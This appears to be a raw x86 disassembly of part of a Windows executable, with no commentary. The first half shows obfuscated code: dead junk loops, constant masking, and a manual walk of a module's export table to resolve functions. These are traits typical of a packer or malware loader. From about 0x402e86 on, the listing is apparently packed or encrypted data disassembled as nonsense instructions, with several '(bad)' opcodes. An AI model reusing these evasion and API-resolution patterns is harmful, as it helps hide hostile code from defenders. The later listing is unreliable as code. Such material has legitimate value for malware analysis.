  4026ca:	add    al,0xc
  4026cc:	xor    al,0x70
  4026ce:	cmp    al,0x29
  4026d0:	mov    DWORD PTR ds:0x413cf0,0x3ac2
  4026da:	jne    0x402787
  4026e0:	add    edx,DWORD PTR ds:0x41401c
  4026e6:	mov    eax,DWORD PTR [ebp+0x8]
  4026e9:	and    DWORD PTR ds:0x413c84,0x0
  4026f3:	jmp    0x402707
  4026f8:	xor    edx,edx
  4026fa:	xor    edx,DWORD PTR ds:0x413c84
  402700:	inc    edx
  402701:	mov    DWORD PTR ds:0x413c84,edx
  402707:	cmp    DWORD PTR ds:0x413c84,0x12
  40270e:	jae    0x40274b
  402714:	cmp    DWORD PTR ds:0x413c84,0x7
  40271b:	jne    0x40272c
  402721:	push   0x4160b3
  402726:	call   DWORD PTR ds:0x41677c
  40272c:	cmp    DWORD PTR ds:0x413c84,0x6
  402733:	jne    0x402746
  402739:	mov    edx,DWORD PTR ds:0x413c84
  40273f:	inc    edx
  402740:	mov    DWORD PTR ds:0x413c84,edx
  402746:	jmp    0x4026f8
  40274b:	mov    ecx,DWORD PTR [ebp+0x8]
  40274e:	add    ecx,DWORD PTR [eax+0x3c]
  402751:	mov    edx,0x7510894
  402756:	mov    DWORD PTR [ebp+0x8],ecx
  402759:	mov    eax,DWORD PTR [ebp-0x4]
  40275c:	xor    eax,edx
  40275e:	push   esi
  40275f:	mov    esi,DWORD PTR [ebp+0x8]
  402762:	mov    ecx,0x3272dc
  402767:	add    eax,ecx
  402769:	cmp    DWORD PTR [esi+0x54],eax
  40276c:	pop    esi
  40276d:	je     0x40277b
  402773:	mov    eax,DWORD PTR [ebp+0x8]
  402776:	jmp    0x402794
  40277b:	mov    eax,DWORD PTR [ebp-0x4]
  40277e:	xor    eax,edx
  402780:	add    eax,ecx
  402782:	jmp    0x402794
  402787:	mov    eax,DWORD PTR [ebp-0x4]
  40278a:	xor    eax,0x7510894
  40278f:	add    eax,0x3272dc
  402794:	leave  
  402795:	ret    0x4
  402798:	push   ebp
  402799:	mov    ebp,esp
  40279b:	sub    esp,0x78
  40279e:	xor    DWORD PTR ds:0x413c1e,0x50b0
  4027a8:	push   ebx
  4027a9:	adc    DWORD PTR ds:0x413d30,0x7f7d
  4027b3:	push   esi
  4027b4:	add    DWORD PTR ds:0x413d30,0x413cf0
  4027be:	push   edi
  4027bf:	push   0x1f
  4027c1:	and    DWORD PTR ds:0x413bf6,0x413c80
  4027cb:	lea    eax,[ebp-0x78]
  4027ce:	push   eax
  4027cf:	push   0x0
  4027d1:	adc    DWORD PTR ds:0x413d34,0x413c80
  4027db:	call   DWORD PTR ds:0x41676c
  4027e1:	push   0x97898797
  4027e6:	call   DWORD PTR ds:0x416754
  4027ec:	sub    ecx,ecx
  4027ee:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4027f5:	xor    DWORD PTR ds:0x414008,0x58a1
  4027ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  402806:	mov    ecx,DWORD PTR [ebp-0x4]
  402809:	mov    ebx,0x7510894
  40280e:	xor    ecx,ebx
  402810:	mov    eax,0x3272dc
  402815:	xor    DWORD PTR ds:0x413c6c,0x3fbb
  40281f:	add    ecx,eax
  402821:	mov    DWORD PTR [ebp-0x1c],ecx
  402824:	sbb    DWORD PTR ds:0x413d34,edi
  40282a:	mov    ecx,DWORD PTR [ebp+0x14]
  40282d:	test   ecx,ecx
  40282f:	je     0x402847
  402835:	mov    ecx,DWORD PTR [ebp+0x14]
  402838:	mov    ecx,DWORD PTR [ecx]
  40283a:	or     DWORD PTR ds:0x413c0a,0x414000
  402844:	mov    DWORD PTR [ebp-0x1c],ecx
  402847:	mov    DWORD PTR ds:0x413d34,0x1f
  402851:	cmp    DWORD PTR ds:0x413d34,0x0
  402858:	je     0x40288f
  40285e:	cmp    DWORD PTR ds:0x413d34,0x22
  402865:	jne    0x40287d
  40286b:	push   0x414010
  402870:	push   0x0
  402872:	push   0x416017
  402877:	call   DWORD PTR ds:0x416780
  40287d:	mov    ecx,DWORD PTR ds:0x413d34
  402883:	dec    ecx
  402884:	mov    DWORD PTR ds:0x413d34,ecx
  40288a:	jmp    0x402851
  40288f:	mov    ecx,0x7665
  402894:	sbb    edi,edi
  402896:	imul   edx,eax
  402899:	and    DWORD PTR ds:0x413c80,0x0
  4028a3:	mov    esi,DWORD PTR ds:0x413c80
  4028a9:	inc    esi
  4028aa:	mov    DWORD PTR ds:0x413c80,esi
  4028b0:	cmp    DWORD PTR ds:0x413c80,0xc
  4028b7:	jne    0x4028cb
  4028bd:	push   0x413ce4
  4028c2:	push   DWORD PTR [ebp-0x20]
  4028c5:	call   DWORD PTR ds:0x416784
  4028cb:	cmp    DWORD PTR ds:0x413c80,0xb
  4028d2:	jne    0x4028e5
  4028d8:	mov    esi,DWORD PTR ds:0x413c80
  4028de:	inc    esi
  4028df:	mov    DWORD PTR ds:0x413c80,esi
  4028e5:	cmp    DWORD PTR ds:0x413c80,0x1c
  4028ec:	jb     0x4028a3
  4028f2:	mov    esi,0x76532
  4028f7:	mov    DWORD PTR ds:0x413d30,0x639a
  402901:	add    edx,ecx
  402903:	movzx  edi,BYTE PTR ds:0x413ce4
  40290a:	and    DWORD PTR ds:0x413bfe,edi
  402910:	xchg   esi,ecx
  402912:	sbb    DWORD PTR ds:0x413c80,edi
  402918:	mov    edi,0x54354
  40291d:	mov    DWORD PTR ds:0x413d34,0x5e6f
  402927:	sub    edx,edi
  402929:	mov    ecx,DWORD PTR [ebp-0x4]
  40292c:	xor    ecx,ebx
  40292e:	mov    DWORD PTR ds:0x413c70,0x13
  402938:	cmp    DWORD PTR ds:0x413c70,0x0
  40293f:	je     0x40299c
  402945:	cmp    DWORD PTR ds:0x413c70,0x5
  40294c:	jne    0x402962
  402952:	push   0x7f69
  402957:	push   0x41606e
  40295c:	call   DWORD PTR ds:0x41678c
  402962:	cmp    DWORD PTR ds:0x413c70,0x6
  402969:	jne    0x40297c
  40296f:	mov    esi,DWORD PTR ds:0x413c70
  402975:	dec    esi
  402976:	mov    DWORD PTR ds:0x413c70,esi
  40297c:	mov    esi,DWORD PTR ds:0x413c70
  402982:	dec    esi
  402983:	mov    DWORD PTR ds:0x413c70,esi
  402989:	jmp    0x402938
  40298e:	mov    esi,DWORD PTR ds:0x413cb0
  402994:	mov    esi,DWORD PTR [esi]
  402996:	adc    DWORD PTR ds:0x414008,esi
  40299c:	add    ecx,eax
  40299e:	mov    DWORD PTR [ebp-0x8],ecx
  4029a1:	sub    ecx,ecx
  4029a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4029a6:	sub    DWORD PTR ds:0x413c80,ebx
  4029ac:	xor    ecx,ebx
  4029ae:	add    ecx,eax
  4029b0:	mov    DWORD PTR [ebp-0x24],ecx
  4029b3:	sub    ecx,0x1ce
  4029b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4029bc:	mov    esi,DWORD PTR ds:0x413c1a
  4029c2:	xor    DWORD PTR ds:0x413d1c,esi
  4029c8:	xor    ecx,ebx
  4029ca:	add    ecx,eax
  4029cc:	add    DWORD PTR ds:0x413d34,edi
  4029d2:	mov    DWORD PTR [ebp-0x30],ecx
  4029d5:	movzx  esi,BYTE PTR ds:0x414010
  4029dc:	sbb    esi,DWORD PTR ds:0x413bfe
  4029e2:	mov    DWORD PTR ds:0x414010,esi
  4029e8:	mov    esi,DWORD PTR [ebp-0x4]
  4029eb:	adc    ecx,DWORD PTR ds:0x413c16
  4029f1:	xor    esi,ebx
  4029f3:	xor    DWORD PTR ds:0x41401c,ecx
  4029f9:	add    esi,eax
  4029fb:	and    DWORD PTR ds:0x413c84,0x0
  402a05:	jmp    0x402a17
  402a0a:	mov    ecx,DWORD PTR ds:0x413c84
  402a10:	inc    ecx
  402a11:	mov    DWORD PTR ds:0x413c84,ecx
  402a17:	cmp    DWORD PTR ds:0x413c84,0x19
  402a1e:	jae    0x402af3
  402a24:	cmp    DWORD PTR ds:0x413c84,0xd
  402a2b:	jne    0x402a51
  402a31:	push   0x7c39
  402a36:	push   0x413c1e
  402a3b:	push   0x8717
  402a40:	push   0x416025
  402a45:	push   DWORD PTR [ebp-0x28]
  402a48:	push   DWORD PTR [ebp-0x10]
  402a4b:	call   DWORD PTR ds:0x416790
  402a51:	cmp    DWORD PTR ds:0x413c84,0xc
  402a58:	jne    0x402a6b
  402a5e:	mov    ecx,DWORD PTR ds:0x413c84
  402a64:	inc    ecx
  402a65:	mov    DWORD PTR ds:0x413c84,ecx
  402a6b:	jmp    0x402a0a
  402a70:	mov    DWORD PTR ds:0x413d30,0x12
  402a7a:	cmp    DWORD PTR ds:0x413d30,0x0
  402a81:	je     0x402af3
  402a87:	cmp    DWORD PTR ds:0x413d30,0x21
  402a8e:	jne    0x402a9f
  402a94:	push   0x1529
  402a99:	call   DWORD PTR ds:0x416798
  402a9f:	mov    ecx,DWORD PTR ds:0x413d30
  402aa5:	dec    ecx
  402aa6:	mov    DWORD PTR ds:0x413d30,ecx
  402aac:	jmp    0x402a7a
  402ab1:	and    DWORD PTR ds:0x413d34,0x0
  402abb:	mov    ecx,DWORD PTR ds:0x413d34
  402ac1:	inc    ecx
  402ac2:	mov    DWORD PTR ds:0x413d34,ecx
  402ac8:	cmp    DWORD PTR ds:0x413d34,0x29
  402acf:	jne    0x402ae0
  402ad5:	push   0x413c12
  402ada:	call   DWORD PTR ds:0x41679c
  402ae0:	cmp    DWORD PTR ds:0x413d34,0x19
  402ae7:	jb     0x402abb
  402aed:	or     ecx,DWORD PTR ds:0x413c0a
  402af3:	mov    ecx,DWORD PTR [ebp-0x24]
  402af6:	or     DWORD PTR ds:0x413c88,0x413c12
  402b00:	sub    ecx,eax
  402b02:	add    DWORD PTR ds:0x413c1e,0x57cd
  402b0c:	lea    edx,[esi-0x3272dc]
  402b12:	xor    ecx,ebx
  402b14:	and    DWORD PTR ds:0x413ce8,0xb77
  402b1e:	xor    edx,ebx
  402b20:	mov    DWORD PTR ds:0x413bfe,0x29ac
  402b2a:	cmp    edx,ecx
  402b2c:	mov    DWORD PTR ds:0x413ce4,0x2b4b
  402b36:	je     0x402e02
  402b3c:	sub    ecx,DWORD PTR ds:0x413d34
  402b42:	mov    ecx,DWORD PTR [ebp-0x4]
  402b45:	xor    DWORD PTR ds:0x413bfe,0x413c84
  402b4f:	xor    ecx,ebx
  402b51:	adc    DWORD PTR ds:0x413bf6,0x7b2
  402b5b:	add    ecx,eax
  402b5d:	cmp    esi,ecx
  402b5f:	jne    0x402ddf
  402b65:	or     DWORD PTR ds:0x413cf0,0x413c1e
  402b6f:	push   DWORD PTR [ebp+0x8]
  402b72:	call   0x4026a6
  402b77:	mov    DWORD PTR ds:0x414004,0x1c
  402b81:	cmp    DWORD PTR ds:0x414004,0x0
  402b88:	je     0x402bc3
  402b8e:	cmp    DWORD PTR ds:0x414004,0x2b
  402b95:	jne    0x402ba9
  402b9b:	push   0x413c6c
  402ba0:	push   DWORD PTR [ebp-0x24]
  402ba3:	call   DWORD PTR ds:0x41675c
  402ba9:	xor    ecx,ecx
  402bab:	or     ecx,DWORD PTR ds:0x414004
  402bb1:	dec    ecx
  402bb2:	mov    DWORD PTR ds:0x414004,ecx
  402bb8:	jmp    0x402b81
  402bbd:	sbb    DWORD PTR ds:0x413d34,ecx
  402bc3:	mov    DWORD PTR [ebp-0x18],eax
  402bc6:	and    DWORD PTR ds:0x413d28,0x0
  402bd0:	jmp    0x402be2
  402bd5:	mov    ecx,DWORD PTR ds:0x413d28
  402bdb:	inc    ecx
  402bdc:	mov    DWORD PTR ds:0x413d28,ecx
  402be2:	cmp    DWORD PTR ds:0x413d28,0x16
  402be9:	jae    0x402c2e
  402bef:	cmp    DWORD PTR ds:0x413d28,0x5
  402bf6:	jne    0x402c0f
  402bfc:	push   DWORD PTR [ebp-0x10]
  402bff:	push   0x41400c
  402c04:	push   0x2409
  402c09:	call   DWORD PTR ds:0x416760
  402c0f:	cmp    DWORD PTR ds:0x413d28,0x4
  402c16:	jne    0x402c29
  402c1c:	mov    ecx,DWORD PTR ds:0x413d28
  402c22:	inc    ecx
  402c23:	mov    DWORD PTR ds:0x413d28,ecx
  402c29:	jmp    0x402bd5
  402c2e:	mov    eax,DWORD PTR [ebp-0x4]
  402c31:	sub    DWORD PTR ds:0x413ce4,0x168d
  402c3b:	mov    ecx,DWORD PTR [ebp-0x18]
  402c3e:	inc    edi
  402c3f:	xor    eax,ebx
  402c41:	and    DWORD PTR ds:0x413c88,0x0
  402c4b:	jmp    0x402c5d
  402c50:	mov    edi,DWORD PTR ds:0x413c88
  402c56:	inc    edi
  402c57:	mov    DWORD PTR ds:0x413c88,edi
  402c5d:	cmp    DWORD PTR ds:0x413c88,0x1c
  402c64:	jae    0x402ca8
  402c6a:	cmp    DWORD PTR ds:0x413c88,0x5
  402c71:	jne    0x402c89
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	push   DWORD PTR [ebp-0x10]
  402c7d:	push   DWORD PTR [ebp-0x28]
  402c80:	push   DWORD PTR [ebp-0xc]
  402c83:	call   DWORD PTR ds:0x416764
  402c89:	cmp    DWORD PTR ds:0x413c88,0x4
  402c90:	jne    0x402ca3
  402c96:	mov    edi,DWORD PTR ds:0x413c88
  402c9c:	inc    edi
  402c9d:	mov    DWORD PTR ds:0x413c88,edi
  402ca3:	jmp    0x402c50
  402ca8:	mov    edi,0x3272dc
  402cad:	sbb    DWORD PTR ds:0x414008,0x338e
  402cb7:	add    eax,edi
  402cb9:	cmp    ecx,eax
  402cbb:	mov    DWORD PTR ds:0x413bfe,0x2c9f
  402cc5:	je     0x402e72
  402ccb:	adc    DWORD PTR ds:0x413c74,0x2cc9
  402cd5:	push   DWORD PTR [ebp-0x18]
  402cd8:	add    DWORD PTR ds:0x413c74,0x6616
  402ce2:	push   DWORD PTR [ebp+0x8]
  402ce5:	neg    DWORD PTR ds:0x413d2c
  402ceb:	call   0x407cf9
  402cf0:	mov    DWORD PTR [ebp-0x18],eax
  402cf3:	xor    DWORD PTR ds:0x413c12,ebx
  402cf9:	mov    eax,DWORD PTR [ebp-0x4]
  402cfc:	add    DWORD PTR ds:0x414008,edx
  402d02:	mov    ecx,DWORD PTR [ebp-0x18]
  402d05:	sub    DWORD PTR ds:0x413cdc,0x28ac
  402d0f:	xor    eax,ebx
  402d11:	sub    DWORD PTR ds:0x41400c,0x413ce4
  402d1b:	add    eax,edi
  402d1d:	cmp    ecx,eax
  402d1f:	je     0x402e72
  402d25:	or     DWORD PTR ds:0x414014,edi
  402d2b:	mov    eax,DWORD PTR [ebp-0x18]
  402d2e:	mov    ecx,DWORD PTR ds:0x414008
  402d34:	adc    ecx,DWORD PTR ds:0x413c7c
  402d3a:	mov    DWORD PTR ds:0x414008,ecx
  402d40:	mov    eax,DWORD PTR [eax+0x18]
  402d43:	mov    ecx,DWORD PTR ds:0x413ca4
  402d49:	mov    ecx,DWORD PTR [ecx]
  402d4b:	and    DWORD PTR ds:0x413d28,ecx
  402d51:	mov    DWORD PTR [ebp-0x24],eax
  402d54:	and    DWORD PTR ds:0x413c70,0x0
  402d5e:	mov    ecx,DWORD PTR ds:0x413c70
  402d64:	inc    ecx
  402d65:	mov    DWORD PTR ds:0x413c70,ecx
  402d6b:	cmp    DWORD PTR ds:0x413c70,0xf
  402d72:	jne    0x402d8d
  402d78:	push   0x2d13
  402d7d:	push   0x29b5
  402d82:	push   0x400000
  402d87:	call   DWORD PTR ds:0x416768
  402d8d:	cmp    DWORD PTR ds:0x413c70,0xe
  402d94:	jne    0x402da7
  402d9a:	mov    ecx,DWORD PTR ds:0x413c70
  402da0:	inc    ecx
  402da1:	mov    DWORD PTR ds:0x413c70,ecx
  402da7:	cmp    DWORD PTR ds:0x413c70,0x18
  402dae:	jb     0x402d5e
  402db4:	mov    eax,DWORD PTR [ebp-0x18]
  402db7:	mov    ecx,DWORD PTR [ebp+0x8]
  402dba:	add    ecx,DWORD PTR [eax+0x20]
  402dbd:	mov    DWORD PTR [ebp-0x2c],ecx
  402dc0:	mov    eax,DWORD PTR [ebp-0x18]
  402dc3:	mov    ecx,DWORD PTR [ebp+0x8]
  402dc6:	add    ecx,DWORD PTR [eax+0x24]
  402dc9:	mov    DWORD PTR [ebp-0x34],ecx
  402dcc:	mov    eax,DWORD PTR [ebp-0x18]
  402dcf:	mov    ecx,DWORD PTR [ebp+0x8]
  402dd2:	add    ecx,DWORD PTR [eax+0x1c]
  402dd5:	mov    eax,edi
  402dd7:	mov    DWORD PTR [ebp-0x18],ecx
  402dda:	jmp    0x402e3a
  402ddf:	mov    ecx,DWORD PTR [ebp-0x2c]
  402de2:	mov    edx,DWORD PTR [ebp+0x8]
  402de5:	add    edx,DWORD PTR [ecx+esi*4]
  402de8:	mov    DWORD PTR [ebp-0x28],edx
  402deb:	mov    ecx,DWORD PTR [ebp-0x4]
  402dee:	mov    edx,DWORD PTR [ebp-0x28]
  402df1:	xor    ecx,ebx
  402df3:	add    ecx,eax
  402df5:	cmp    edx,ecx
  402df7:	je     0x402e3a
  402dfd:	jmp    0x402e26
  402e02:	mov    ecx,DWORD PTR [ebp-0x4]
  402e05:	mov    edx,DWORD PTR [ebp-0x8]
  402e08:	xor    ecx,ebx
  402e0a:	add    ecx,eax
  402e0c:	cmp    edx,ecx
  402e0e:	je     0x402e7e
  402e14:	mov    ecx,DWORD PTR [ebp-0x4]
  402e17:	mov    edx,DWORD PTR [ebp-0x30]
  402e1a:	xor    ecx,ebx
  402e1c:	add    ecx,eax
  402e1e:	cmp    edx,ecx
  402e20:	je     0x40522e
  402e26:	lea    eax,[ebp-0x8]
  402e29:	push   eax
  402e2a:	push   DWORD PTR [ebp-0x28]
  402e2d:	push   DWORD PTR [ebp+0xc]
  402e30:	call   0x40a47a
  402e35:	mov    eax,0x3272dc
  402e3a:	mov    ecx,DWORD PTR [ebp-0x4]
  402e3d:	mov    edx,DWORD PTR [ebp-0x8]
  402e40:	xor    ecx,ebx
  402e42:	add    ecx,eax
  402e44:	cmp    edx,ecx
  402e46:	je     0x402e61
  402e4c:	mov    ecx,DWORD PTR [ebp-0x34]
  402e4f:	movzx  ecx,WORD PTR [ecx+esi*2]
  402e53:	mov    edx,DWORD PTR [ebp-0x18]
  402e56:	mov    ecx,DWORD PTR [edx+ecx*4]
  402e59:	mov    DWORD PTR [ebp-0x38],ecx
  402e5c:	jmp    0x402e02
  402e61:	mov    ecx,DWORD PTR [ebp-0x14]
  402e64:	xor    ecx,ebx
  402e66:	lea    esi,[esi+ecx*1+0x3272dc]
  402e6d:	jmp    0x4029fb
  402e72:	mov    eax,DWORD PTR [ebp-0x4]
  402e75:	xor    eax,ebx
  402e77:	add    eax,edi
  402e79:	jmp    0x405392
  402e7e:	mov    eax,DWORD PTR [ebp-0x4]
  402e81:	jmp    0x405222
  402e86:	or     al,0xe7
  402e88:	xchg   BYTE PTR [ebx-0x240e7489],cl
  402e8e:	xchg   bl,cl
  402e90:	pushf  
  402e91:	cmp    DWORD PTR [edi],edx
  402e93:	xchg   ebp,eax
  402e94:	mov    ds:0x7c7c7c03,eax
  402e99:	jl     0x402e7b
  402e9b:	pop    edi
  402e9c:	jl     0x402f1a
  402e9e:	adc    eax,0x1921172e
  402ea3:	and    eax,0x3a652f1b
  402ea8:	imul   ebp,DWORD PTR [eax-0x2],0x6d6c6c64
  402eaf:	xor    al,0xc5
  402eb1:	fsubrp st(1),st
  402eb3:	push   edx
  402eb4:	dec    edx
  402eb5:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff92
  402eb9:	bound  ebp,QWORD PTR [ebp+0x59]
  402ebc:	iret   
  402ebd:	pop    ebp
  402ebe:	dec    esp
  402ebf:	and    cl,BYTE PTR [esi+0x577887fc]
  402ec5:	dec    ebp
  402ec6:	jg     0x402eff
  402ec8:	jb     0x402e72
  402eca:	jg     0x402e6e
  402ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ecd:	cmp    ebp,DWORD PTR [esi]
  402ecf:	jmp    FWORD PTR [eax-0x22]
  402ed2:	cld    
  402ed3:	push   ebx
  402ed4:	jg     0x402ed6
  402ed6:	in     eax,dx
  402ed7:	cmp    ebp,ecx
  402ed9:	mov    esp,0xc01387ed
  402ede:	mov    ebp,DWORD PTR [ecx]
  402ee0:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c68c]
  402ee7:	fld    QWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	lock cld 
  402eec:	sub    BYTE PTR [edx],bl
  402eee:	dec    edx
  402eef:	push   cs
  402ef0:	sub    BYTE PTR [ebx+0x6a],ch
  402ef3:	mov    ecx,0x54113af
  402ef8:	test   al,0xff
  402efa:	jmp    0x34b65a48
  402eff:	retf   0xf95b
  402f02:	sbb    al,0xfc
  402f04:	jp     0x402ea7
  402f06:	arpl   bp,bx
  402f08:	call   0x8416:0x7a18b5f
  402f0f:	xor    ebx,esi
  402f11:	cmp    BYTE PTR [esi],0x74
  402f14:	jae    0x402f21
  402f16:	fsubr  QWORD PTR ds:0x33368d54
  402f1c:	push   esi
  402f1d:	jecxz  0x402eee
  402f1f:	mov    WORD PTR [ecx],gs
  402f21:	mov    DWORD PTR [edx+0x518aceb7],esi
  402f27:	out    0x45,al
  402f29:	push   esp
  402f2a:	dec    esi
  402f2b:	push   cs
  402f2c:	and    bl,dh
  402f2e:	cmp    BYTE PTR [ebx],al
  402f30:	lods   eax,DWORD PTR ds:[esi]
  402f31:	dec    ebx
  402f32:	int3   
  402f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f34:	xor    al,dl
  402f36:	push   es
  402f37:	pop    eax
  402f38:	std    
  402f39:	push   esp
  402f3a:	pop    eax
  402f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3c:	stc    
  402f3d:	push   0xffffffbf
  402f3f:	cli    
  402f40:	inc    esp
  402f41:	sbb    ecx,esi
  402f43:	rcr    DWORD PTR [ebx],0x3d
  402f46:	mov    ebp,0x74e74e3c
  402f4b:	jne    0x402f2c
  402f4d:	or     al,0xca
  402f4f:	das    
  402f50:	(bad)  
  402f51:	and    dh,BYTE PTR [edi]
  402f53:	dec    edi
  402f54:	xor    eax,DWORD PTR [eax]
  402f56:	inc    edx
  402f57:	mov    edi,DWORD PTR [esi]
  402f59:	and    eax,DWORD PTR fs:[edx-0x58]
  402f5d:	outs   dx,DWORD PTR ds:[esi]
  402f5e:	sbb    al,BYTE PTR [eax+0x6b9d0122]
  402f64:	das    
  402f65:	sub    al,0x27
  402f67:	dec    ecx
  402f68:	arpl   WORD PTR [ebp+0x5d],di
  402f6b:	les    esi,FWORD PTR [edx+0x25dd0486]
  402f71:	dec    ebp
  402f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f73:	js     0x402f81
  402f75:	cmp    ch,dh
  402f77:	loope  0x402fe2
  402f79:	inc    esp
  402f7a:	xlat   BYTE PTR ds:[ebx]
  402f7b:	(bad)  
  402f7c:	cmp    dh,ch
  402f7e:	leave  
  402f7f:	jmp    0x73b881b8
  402f84:	outs   dx,BYTE PTR ds:[esi]
  402f85:	pop    edi
  402f86:	in     al,0xbe
  402f88:	stos   BYTE PTR es:[edi],al
  402f89:	add    DWORD PTR [ebx+0x3f],edi
  402f8c:	add    edx,DWORD PTR ds:0x4dd43362
  402f92:	test   al,0x67
  402f94:	outs   dx,BYTE PTR ds:[esi]
  402f95:	adc    al,0x16
  402f97:	int3   
  402f98:	outs   dx,BYTE PTR ds:[esi]
  402f99:	xor    eax,0x1903fd90
  402f9e:	ins    DWORD PTR es:[edi],dx
  402f9f:	mov    al,ds:0xaea41e89
  402fa4:	inc    esi
  402fa5:	dec    ebx
  402fa6:	out    0xbc,eax
  402fa8:	add    BYTE PTR [edx-0x37],cl
  402fab:	int3   
  402fac:	push   edi
  402fad:	xchg   ebx,eax
  402fae:	mov    esp,0x4b7d630d
  402fb3:	cmp    al,0x53
  402fb5:	or     dl,ch
  402fb7:	adc    edi,edx
  402fb9:	jl     0x402fe7
  402fbb:	repz jmp 0x1f71:0x310d503a
  402fc3:	add    al,0xfa
  402fc5:	gs test ch,0x75
  402fc9:	mov    edi,0x68e456dc
  402fce:	std    
  402fcf:	aam    0x18
  402fd1:	xor    ebp,DWORD PTR [ecx-0x47a5b26c]
  402fd7:	add    BYTE PTR [esp+ebx*1],0x4a
  402fdb:	iret   
  402fdc:	jmp    0x7359:0x3aa8d23a
  402fe3:	mov    ds:0xa6e1662b,eax
  402fe8:	ror    BYTE PTR [ecx-0x3e36b6e7],0x68
  402fef:	pop    esp
  402ff0:	mov    dl,0xb5
  402ff2:	push   esi
  402ff3:	and    BYTE PTR [ebx+0x37920d91],0x59
  402ffa:	adc    dl,dl
  402ffc:	mov    eax,0xd9c6ad1c
  403001:	push   eax
  403002:	dec    esi
  403003:	je     0x402fe4
  403005:	scas   al,BYTE PTR es:[edi]
  403006:	mov    BYTE PTR [edi+ebp*1-0x789b9c54],0x39
  40300e:	imul   edx,DWORD PTR ds:0x88fe72d2,0x29
  403015:	mov    esi,0xbe90c26c
  40301a:	fwait
  40301b:	jle    0x403058
  40301d:	retf   0x8104
  403020:	pop    esi
  403021:	pop    ss
  403022:	jb     0x40303f
  403024:	mov    bh,0xb1
  403026:	mov    esi,0xa7f1f339
  40302b:	(bad)  
  40302d:	inc    esp
  40302e:	push   0x1156f05c
  403033:	mov    ds:0x10c1367b,al
  403038:	cmp    BYTE PTR [ebx],ch
  40303a:	jnp    0x403001
  40303c:	cli    
  40303d:	xchg   DWORD PTR [edi+0x23],edi
  403040:	test   al,0xb4
  403042:	das    
  403043:	dec    edi
  403044:	jmp    0x446c:0x279d65a
  40304b:	jg     0x4030c8
  40304d:	mov    al,0xf0
  40304f:	add    BYTE PTR [ebp+0x1257690c],ch
  403055:	push   es
  403056:	aam    0x95
  403058:	pop    ds
  403059:	push   esi
  40305a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40305b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40305c:	aaa    
  40305d:	test   BYTE PTR [eax+0x4d],0x6a
  403061:	test   BYTE PTR ss:[edx],0x27
  403065:	pop    ss
  403066:	mov    gs,edx
  403068:	in     eax,dx
  403069:	rcr    DWORD PTR [ebx+0x4c9d898],1
  40306f:	lahf   
  403070:	and    dl,BYTE PTR [edx+0x3a75f5f6]
  403076:	out    dx,al
  403077:	inc    edx
  403078:	add    dl,dh
  40307a:	lock mov dl,0x91
  40307d:	scas   eax,DWORD PTR es:[edi]
  40307e:	pop    ds
  40307f:	enter  0x14a6,0xce
  403083:	push   esp
  403084:	call   0x5cfc:0x19af1f65
  40308b:	ss push edx
  40308d:	fwait
  40308e:	data16 and ah,dh
  403091:	cmp    BYTE PTR [edi-0x2f],bl
  403094:	bound  edi,QWORD PTR [edi+0x6d]
  403097:	mov    edx,DWORD PTR [eax]
  403099:	cmp    DWORD PTR [edx+0x199dc71],edx
  40309f:	xchg   ebp,eax
  4030a0:	stc    
  4030a1:	test   DWORD PTR [esi+0x4d],0x4aa7a96c
  4030a8:	add    ebp,DWORD PTR [esi+0xd3a849c]
  4030ae:	gs push ss
  4030b0:	pop    edi
  4030b1:	sbb    DWORD PTR [eax-0x74],edi
  4030b4:	pushf  
  4030b5:	and    BYTE PTR [esi],ah
  4030b7:	and    al,bh
  4030b9:	cmp    al,0x42
  4030bb:	loopne 0x4030fc
  4030bd:	jo     0x403129
  4030bf:	(bad)  
  4030c0:	idiv   DWORD PTR [eax]
  4030c2:	xchg   esi,eax
  4030c3:	outs   dx,DWORD PTR fs:[esi]
  4030c5:	dec    ecx
  4030c6:	jbe    0x403137
  4030c8:	mov    ch,0x66
  4030ca:	sbb    edx,DWORD PTR [eax+0x4ab1a988]
  4030d0:	sbb    al,0x5e
  4030d2:	bound  edx,QWORD PTR [edx+0x48]
  4030d5:	aad    0xe0
  4030d7:	or     DWORD PTR [edx+eax*4+0x726d3154],esp
  4030de:	inc    ebp
  4030df:	hlt    
  4030e0:	jno    0x403156
  4030e2:	sti    
  4030e3:	mov    cl,0x6f
  4030e5:	popf   
  4030e6:	push   cs
  4030e7:	pop    ebp
  4030e8:	jne    0x403135
  4030ea:	mov    al,0x6c
  4030ec:	sbb    edi,ecx
  4030ee:	mov    ds:0x1c78370a,al
  4030f3:	fs push ebx
  4030f5:	lods   al,BYTE PTR ds:[esi]
  4030f6:	mov    bh,0xab
  4030f8:	jbe    0x403102
  4030fa:	cmp    bh,BYTE PTR [edx]
  4030fc:	cli    
  4030fd:	or     eax,0x30f3bd95
  403102:	cmp    BYTE PTR [ebx+0x5ccea820],dh
  403108:	xor    BYTE PTR [esi],ah
  40310a:	add    eax,0x7a5deacd
  40310f:	mov    ch,0x17
  403111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403112:	(bad)  
  403113:	div    ah
  403115:	xor    BYTE PTR [edi-0xa],0x42
  403119:	inc    ebx
  40311a:	pushf  
  40311b:	sbb    DWORD PTR [edi-0x6436cdde],ecx
  403121:	aam    0x92
  403123:	push   es
  403124:	adc    eax,0xf58eb1a4
  403129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40312a:	sbb    DWORD PTR ds:0x26666879,0x7d862754
  403134:	(bad)  
  403135:	pop    ebp
  403136:	popf   
  403137:	dec    edi
  403138:	or     bl,BYTE PTR [eax-0x591d8951]
  40313e:	add    eax,0xd346d2bd
  403143:	ret    0x5718
  403146:	cmp    DWORD PTR [esp+ebp*2+0x1a],edx
  40314a:	fscale 
  40314c:	call   0x2efb:0x1c8bf75e
  403153:	out    0xa,al
  403155:	xor    eax,0xee6dd08b
